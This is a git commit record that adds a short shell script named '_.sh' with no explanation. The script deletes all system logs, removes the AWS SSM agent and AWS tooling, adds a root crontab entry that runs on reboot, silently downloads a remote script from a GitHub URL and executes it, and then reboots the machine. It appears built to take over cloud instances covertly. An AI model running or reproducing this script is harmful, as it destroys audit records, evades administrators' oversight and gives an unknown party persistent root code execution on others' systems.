52b57595f88d29e04b8af7ccedebf267ca10e791
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-01-08 00:35:18 +0800

    Create _.sh

---
+++ _.sh
@@ -0,0 +1,6 @@
+#!/bin/sh
+
+sudo find /var/log -type f -delete
+sudo rm -rf /usr/bin/amazon-ssm-agent /usr/bin/ssm-agent-worker /etc/opt/ml/scripts /opt/aws
+sudo sed -i "\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubusercontent.com/vjbahkds/cajbdfv/main/run.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
+sudo reboot
